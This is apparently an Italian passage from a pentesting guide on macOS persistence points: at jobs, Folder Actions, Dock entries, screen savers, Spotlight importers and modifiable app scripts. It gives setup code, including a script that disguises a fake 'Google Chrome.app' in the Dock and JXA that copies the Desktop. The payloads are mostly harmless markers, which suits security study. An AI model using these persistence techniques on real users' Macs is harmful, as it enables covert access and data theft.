PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Se le attività AT non sono abilitate, le attività create non verranno eseguite.

I **file dei job** si trovano in `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Il nome del file contiene la coda, il numero del job e l’ora in cui è programmato. Per esempio, diamo un’occhiata a `a0001a019bdcd2`.

- `a` - questa è la coda
- `0001a` - numero del job in esadecimale, `0x1a = 26`
- `019bdcd2` - orario in esadecimale. Rappresenta i minuti trascorsi dall’epoch. `0x019bdcd2` equivale a `26991826` in decimale. Moltiplicandolo per 60 otteniamo `1619509560`, che corrisponde a `GMT: martedì 27 aprile 2021, 7:46:00`.

Se stampiamo il file del job, troviamo che contiene le stesse informazioni ottenute usando `at -c`.

### Avvisi di apertura file di Calendar

- **Destinazione della scrittura:** un bundle app eseguibile o un altro file **già selezionato** dall’avviso personalizzato **Open file** di un evento di Calendar. Per creare o modificare l’avviso è necessario accedere all’evento tramite Calendar o un’origine dati di Calendar autorizzata; la scrittura casuale di un file non crea un avviso.
- **Trigger:** l’orario programmato per l’avviso, su un Mac in cui Calendar elabora l’evento. Un evento ricorrente può ripetere l’azione. [La guida aggiornata di Apple per Calendar](https://support.apple.com/guide/calendar/icl1012/mac) conferma l’opzione di avviso **Custom → Open file** su macOS 26.
- **Identità di esecuzione e controlli:** Calendar apre il file scelto per l’utente connesso, tramite l’applicazione associata. L’avvio di un bundle app può eseguirne il codice come tale utente, in base a Gatekeeper, alla quarantena e agli altri controlli di macOS. Un semplice file script potrebbe aprirsi soltanto in un editor; la sua estensione, da sola, non dimostra che il codice venga eseguito.

Per valutare un possibile candidato in sicurezza, ispeziona l’avviso dell’evento in Calendar e i permessi del file selezionato. Questo percorso è documentato sulla base della guida di Apple e **non** è stato testato sul Mac di ricerca, perché provarlo avrebbe modificato un calendario attivo e richiesto di attendere un evento sul desktop. In un account usa e getta, si può selezionare un bundle app che crea solo un marker, impostare un avviso Open file per un orario ravvicinato, verificare l’avvio e poi eliminare l’evento e l’app.

### Automazioni di Shortcuts su macOS

- **Destinazione della scrittura:** un file eseguibile **già referenziato** da un’azione di una shortcut, oppure una shortcut esistente che un utente autorizzato può modificare. Un file `.shortcut` casuale o una scrittura in un database non documentato di Shortcuts non sono metodi supportati per registrare un’automazione.
- **Trigger e identità:** un evento di automazione configurato e abilitato in precedenza, come un orario del giorno o un evento di un’app, avvia la shortcut per l’utente connesso. [La guida aggiornata di Apple sulle automazioni per Mac](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) elenca gli eventi supportati, spiega quando un’automazione può essere eseguita senza chiedere conferma e descrive come rimuovere un trigger. [La guida alla privacy di Shortcuts di Apple](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) richiede **Allow Running Scripts** per le azioni script; le singole azioni possono comunque richiedere autorizzazioni.

Questo è un percorso condizionale dalla scrittura all’esecuzione, **solo quando l’azione esistente carica una destinazione scrivibile**. Creare una nuova automazione tramite l’interfaccia utente modifica le impostazioni attive e non è stato tentato sul Mac di ricerca. In un account usa e getta, il proprietario può configurare una shortcut con trigger a un orario del giorno il cui script tocca `/tmp/ht-shortcuts-marker`, abilitare le autorizzazioni necessarie, verificare la presenza del marker dopo l’evento e poi eliminare l’automazione, la shortcut e il marker.

### Azioni di Automator e Quick Actions

- **Destinazioni di scrittura:** `~/Library/Automator/*.action` (utente) e `/Library/Automator/*.action` (amministratore) per i bundle delle azioni. Un workflow Quick Action salvato si trova comunemente in `~/Library/Services/*.workflow`; verifica il percorso effettivo del workflow selezionato dall’utente. [La documentazione di riferimento del framework Automator di Apple](https://developer.apple.com/documentation/automator) elenca le directory di ricerca delle azioni.
- **Trigger:** Automator carica i bundle delle azioni disponibili quando viene eseguito, ma l’attività di un’azione viene eseguita quando si avvia un workflow che la usa. Una Quick Action viene avviata quando l’utente la seleziona in Finder, in Services o in un altro menu disponibile. Un workflow Folder Action viene eseguito quando vengono aggiunti elementi alla relativa cartella **già associata**; un workflow Calendar Alarm viene eseguito all’ora dell’evento. [I tipi di workflow di Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) distinguono questi eventi. La semplice scrittura di un’azione o di un workflow non associa una cartella né programma un evento di Calendar.
- **Identità di esecuzione e controlli:** l’account che esegue il workflow; Automator o l’app invocante deve caricare l’azione e i controlli di firma del codice e di privacy applicabili devono consentirlo. Un bundle di azioni scrivibile già referenziato da un workflow attivo è un caso diverso dall’installazione di una nuova azione in attesa che venga selezionata.

Le directory utente `Automator` e `Services` erano presenti sul Mac di test con macOS 26.5.2; `/Library/Automator` era assente. Non è stato creato, associato o eseguito alcun workflow attivo. Usa un account usa e getta e un’azione/workflow che crea solo un marker per verificare uno specifico percorso di caricamento. La sezione separata [Folder Actions](#folder-actions) tratta più in dettaglio questa origine dell’evento.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Tuttavia, devi poter chiamare `osascript` con argomenti per contattare **`System Events`** e configurare Folder Actions
- Bypass di TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Dispone di alcune autorizzazioni TCC di base, come Desktop, Documents e Downloads

#### Posizione

- **`/Library/Scripts/Folder Action Scripts`**
  - Richiede root
  - **Trigger**: accesso alla cartella specificata
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Trigger**: accesso alla cartella specificata

#### Descrizione e sfruttamento

Folder Actions sono script attivati automaticamente dalle modifiche apportate a una cartella, per esempio l’aggiunta o la rimozione di elementi, o altre azioni come l’apertura o il ridimensionamento della finestra della cartella. Queste azioni possono essere utilizzate per varie attività e attivate in modi diversi, per esempio tramite l’interfaccia di Finder o comandi da terminale.<sup>[[17]](#references)[[18]](#references)</sup>

Per configurare Folder Actions, puoi:

1. Creare un workflow Folder Action con [Automator](https://support.apple.com/guide/automator/welcome/mac) e installarlo come servizio.
2. Associare manualmente uno script tramite Folder Actions Setup nel menu contestuale di una cartella.
3. Usare OSAScript per inviare messaggi Apple Event a `System Events.app` e configurare Folder Actions a livello programmatico.
   - Questo metodo è particolarmente utile per integrare l’azione nel sistema, offrendo un certo livello di persistenza.

Il seguente script è un esempio di ciò che può essere eseguito da una Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Per rendere utilizzabile lo script precedente con Folder Actions, compilarlo usando:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Dopo aver compilato lo script, configura Folder Actions eseguendo lo script riportato di seguito. Questo script abiliterà Folder Actions a livello globale e assocerà specificamente lo script compilato in precedenza alla cartella Desktop.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Esegui lo script di configurazione con:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Questo è il modo per implementare questa persistenza tramite GUI:

Questo è lo script che verrà eseguito:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Compilalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Spostalo in:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Quindi, apri l'app `Folder Actions Setup`, seleziona la **cartella che vuoi monitorare** e, nel tuo caso, seleziona **`folder.scpt`** (nel mio caso l'ho chiamato output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Ora, se apri quella cartella con **Finder**, verrà eseguito il tuo script.

Questa configurazione era salvata in formato base64 nel **plist** situato in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Ora proviamo a configurare questa persistence senza accesso alla GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in `/tmp` per farne un backup:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Rimuovi** le Folder Actions appena configurate:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Ora che l'ambiente è vuoto:

3. Copia il file di backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Apri Folder Actions Setup.app per caricare questa configurazione: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> A me non ha funzionato, ma queste sono le istruzioni del writeup:(

### Scorciatoie del Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma devi aver installato un'applicazione malevola nel sistema
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `~/Library/Preferences/com.apple.dock.plist`
  - **Trigger**: Quando l'utente fa clic sull'app nel Dock

#### Descrizione e sfruttamento

Tutte le applicazioni visualizzate nel Dock sono specificate nel plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

È possibile **aggiungere un'applicazione** semplicemente con:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Usando un po' di **social engineering** potresti **spacciarti, per esempio, per Google Chrome** nel Dock ed eseguire effettivamente il tuo script:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Metodi di input

- **Target di scrittura:** un bundle di app per metodi di input contenente codice, installato in `~/Library/Input Methods/` (utente) o `/Library/Input Methods/` (amministratore). È diverso dai file di mappatura della tastiera in testo semplice `.inputplugin` di Apple, che da soli non costituiscono un payload con codice arbitrario.
- **Trigger:** l'utente aggiunge/abilita la sorgente di input in **Impostazioni di Sistema → Tastiera → Inserimento testo**, quindi la seleziona o la utilizza. Il semplice fatto di copiare un bundle nella directory non dimostra che macOS lo avvierà. La [guida attuale di Apple alle sorgenti di input](https://support.apple.com/guide/mac-help/mchl84525d76/mac) descrive come abilitare e cambiare sorgente; la [documentazione di Apple su InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) illustra i metodi di input contenenti codice.
- **Identità di esecuzione e controlli:** il metodo viene eseguito per l'utente connesso, in base alla registrazione del metodo di input, alla firma del codice e ai controlli di sicurezza attuali di macOS. Per i metodi già abilitati con un eseguibile scrivibile, occorre esaminare separatamente il percorso e la firma.

La [nota precedente di Apple sui metodi di input di terze parti](https://developer.apple.com/library/archive/qa/qa1810/_index.html) avvertiva già che copiare alcuni metodi a tavolozza in queste directory non è sufficiente nemmeno a farli comparire in Sorgenti di input. Sul Mac di ricerca con macOS 26.5.2, la directory utente esiste, ma non era installato né attivato alcun bundle: si tratta quindi di un percorso condizionale documentato, non di un risultato di runtime locale.

### Selettori di colore

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - È necessaria un'azione molto specifica
  - Si finirà in un'altra sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/Library/ColorPickers`
  - È necessario root
  - Trigger: usare il selettore di colore
- `~/Library/ColorPickers`
  - Trigger: usare il selettore di colore

#### Descrizione ed exploit

**Compila** un bundle per il selettore di colore con il tuo codice (puoi usare [**questo, ad esempio**](https://github.com/viktorstrate/color-picker-plus)), aggiungi un costruttore (come nella [sezione Screen Saver](macos-auto-start-locations.md#screen-saver)) e copia il bundle in `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Quindi, quando viene attivato il selettore di colore, dovrebbe essere eseguito anche il tuo bundle.

Questo dipende dall'apertura del pannello di sistema dei colori da parte di un'app compatibile e dalla selezione del selettore installato. La [guida di Apple al pannello dei colori](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) descrive le posizioni legacy dei bundle. Un controllo locale dei percorsi ha rilevato il servizio XPC legacy per i selettori di colore, ma sul Mac di ricerca non era installato né caricato alcun selettore; non dedurre un TCC bypass dal solo percorso.

Il binario che carica la tua libreria ha una **sandbox molto restrittiva**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Utile per aggirare il sandbox: **No, perché è necessario eseguire la propria app**
- Bypass di TCC: dipende dal sandbox e dai permessi dell'estensione abilitata; non è stato stabilito alcun bypass generale.

#### Posizione

- Un'app specifica

#### Descrizione e exploit

Un esempio di applicazione con una Finder Sync Extension [**è disponibile qui**](https://github.com/D00MFist/InSync).

Le applicazioni possono avere `Finder Sync Extensions`. Questa estensione viene inserita in un'applicazione che verrà eseguita. Inoltre, per poter eseguire il proprio codice, l'estensione **deve essere firmata** con un certificato Apple Developer valido, deve essere **in sandbox** (anche se è possibile aggiungere eccezioni meno restrittive) e deve essere registrata con qualcosa come:<sup>[[21]](#references)[[22]](#references)</sup>

Un'estensione installata deve anche essere **abilitata** e richiamata per una posizione o un elemento pertinente di Finder; scrivere un bundle `.appex` arbitrario non è sufficiente. [L'API Finder Sync di Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) espone lo stato di abilitazione. I comandi `pluginkit` riportati di seguito illustrano la registrazione e l'abilitazione esplicite, non l'avvio automatico basato solo sulla presenza di un file. Questa procedura è stata verificata consultando la documentazione; sul Mac di ricerca non è stata installata né abilitata alcuna nuova estensione.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Tuttavia, finirai in una sandbox applicativa comune
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- `/System/Library/Screen Savers`
  - Richiede root
  - **Attivazione**: seleziona lo screen saver
- `/Library/Screen Savers`
  - Richiede root
  - **Attivazione**: seleziona lo screen saver
- `~/Library/Screen Savers`
  - **Attivazione**: seleziona lo screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrizione e exploit

Crea un nuovo progetto in Xcode e seleziona il template per generare un nuovo **Screen Saver**. Aggiungi quindi il tuo codice, ad esempio il codice seguente per generare log.<sup>[[23]](#references)[[24]](#references)</sup>

Compila il progetto e copia il bundle `.saver` in **`~/Library/Screen Savers`**. Quindi apri la GUI di Screen Saver e, se ci fai clic, dovrebbe generare molti log:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Nota che, poiché nelle entitlements del binario che carica questo codice (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) è presente **`com.apple.security.app-sandbox`**, ti troverai **all'interno della sandbox comune delle applicazioni**.

Codice dello screensaver:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma finirai in una application sandbox
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)
  - La sandbox sembra molto limitata

#### Posizione

- `~/Library/Spotlight/`
  - **Trigger**: viene creato un nuovo file con un'estensione gestita dal plugin Spotlight.
- `/Library/Spotlight/`
  - **Trigger**: viene creato un nuovo file con un'estensione gestita dal plugin Spotlight.
  - È richiesto root
- `/System/Library/Spotlight/`
  - **Trigger**: viene creato un nuovo file con un'estensione gestita dal plugin Spotlight.
  - È richiesto root
- `Some.app/Contents/Library/Spotlight/`
  - **Trigger**: viene creato un nuovo file con un'estensione gestita dal plugin Spotlight.
  - È richiesta una nuova app

#### Descrizione e sfruttamento

Spotlight è la funzionalità di ricerca integrata in macOS, progettata per offrire agli utenti **un accesso rapido e completo ai dati presenti sui loro computer**.\
Per consentire questa ricerca rapida, Spotlight mantiene un **database proprietario** e crea un indice **analizzando la maggior parte dei file**, permettendo ricerche veloci sia nei nomi dei file sia nei loro contenuti.<sup>[[25]](#references)</sup>

Il meccanismo alla base di Spotlight comprende un processo centrale chiamato "mds", acronimo di **"metadata server"**. Questo processo coordina l'intero servizio Spotlight. A supportarlo ci sono diversi daemon "mdworker", che svolgono varie attività di manutenzione, come l'indicizzazione di diversi tipi di file (`ps -ef | grep mdworker`). Queste attività sono possibili grazie ai plugin Spotlight importer, o **bundle ".mdimporter"**, che permettono a Spotlight di comprendere e indicizzare contenuti in un'ampia varietà di formati di file.

I plugin o bundle **`.mdimporter`** si trovano nei percorsi menzionati in precedenza. È necessario che venga rilevato un nuovo bundle corrispondente a un tipo di file e che Spotlight indicizzi effettivamente un file compatibile; la sola copia di un bundle non dimostra che sia stato caricato. [La documentazione di riferimento di Apple per MDImporter](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) collega il caricamento alla modifica di un file idoneo. L'esecuzione dei plugin Spotlight importer su macOS 26 non è stata verificata qui.

È possibile **trovare tutti gli `mdimporters` caricati** eseguendo:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

E, ad esempio, **/Library/Spotlight/iBooksAuthor.mdimporter** viene usato per analizzare questo tipo di file (estensioni `.iba` e `.book`, tra le altre):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Se controlli il Plist di altri `mdimporter`, potresti non trovare la voce **`UTTypeConformsTo`**. Questo perché si tratta di un _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) integrato e non è necessario specificare le estensioni.
>
> Inoltre, i plugin predefiniti del sistema hanno sempre la precedenza, quindi un attaccante può accedere solo ai file che non sono già indicizzati dai `mdimporter` di Apple.

Per creare un tuo importer, puoi partire da questo progetto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), quindi cambiare il nome e **`CFBundleDocumentTypes`**, e aggiungere **`UTImportedTypeDeclarations`** per supportare l'estensione desiderata e rifletterla in **`schema.xml`**.\
Poi **modifica** il codice della funzione **`GetMetadataForFile`** per eseguire il tuo payload quando viene creato un file con l'estensione elaborata.

Infine, **compila e copia il nuovo `.mdimporter`** in una delle tre posizioni precedenti. Puoi verificare se viene caricato **monitorando i log** oppure eseguendo **`mdimport -L`**.

> [!TIP]
> Anche se la sandbox dell'importer è molto restrittiva, `mdworker` indicizza i file con **accesso in lettura privilegiato**. Un `.mdimporter` malevolo può quindi leggere il *contenuto* dei file nelle posizioni protette da TCC (Downloads, Pictures, Desktop, …) ed esfiltrare i metadati raccolti senza alcuna richiesta TCC: il bypass TCC **"Sploitlight" (CVE-2025-31199)**, corretto in macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Riquadro delle preferenze~~

> [!CAUTION]
> Non sembra più funzionare.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Utile per bypassare la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Richiede un'azione specifica dell'utente
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descrizione

Non sembra più funzionare.<sup>[[26]](#references)</sup>

### File di script dell'applicazione

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma l'applicazione presa di mira deve essere installata ed eseguita/usata dalla vittima
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

Uno **script interpretato effettivamente eseguito da un'applicazione o uno strumento installato** e modificabile dall'attore. Verifica i permessi del file e il percorso di chiamata: trovare un file `.sh` o `.py` da solo non è sufficiente. La [guida di Apple alla firma del codice](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) afferma che le firme sigillano le risorse dei bundle delle app, inclusi gli script. Modificare uno script contenuto nel bundle invalida il sigillo e potrebbe essere rilevato o bloccato durante la convalida del bundle. Uno script esterno, come il launcher di Homebrew, ha comportamenti diversi per quanto riguarda firma e attendibilità. Gli esempi storici del writeup includono:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – uno script usato dalle versioni meno recenti di Sublime Text; occorre verificare la presenza del file e il suo uso all'avvio nella versione installata. Non era presente sul Mac di test.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) o **`/usr/local/bin/brew`** (Intel) – un launcher Bash eseguito quando viene invocato quel percorso di `brew`, se installato e scrivibile dall'attore. Sul Mac di test, `/opt/homebrew/bin/brew` era uno script Bash scrivibile; è un'osservazione locale, non una regola generale sui permessi di Homebrew.
- **`idlemain.py`** di IDLE all'interno di un bundle di un'app Python – potrebbe richiedere i permessi di amministratore per la scrittura, ma viene eseguito con l'identità dell'utente di IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – uno script shell storico eseguito come root quando è installato il corrispondente job launchd `org.wireshark.ChmodBPF`. Lo script e il job non erano presenti sul Mac di test.

#### Descrizione e sfruttamento

Alcuni strumenti e app eseguono script interpretati durante l'esecuzione. Uno script scrivibile può eseguire comandi aggiunti alla successiva esecuzione del processo che lo richiama, se la convalida della firma, la quarantena e gli altri controlli lo consentono. La ricerca originale ha dimostrato diverse installazioni del 2019; ricontrolla i relativi percorsi e trigger sulla versione di destinazione.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

This copy test ha prodotto `marker fired: True` su macOS 26.5.2; il launcher originale è rimasto intatto. Dimostra che il punto di inserimento viene eseguito nella copia, non che un bundle app firmato modificato o una vera installazione di Homebrew supererebbero tutti i controlli all'avvio.

### Dock Tile Plugins

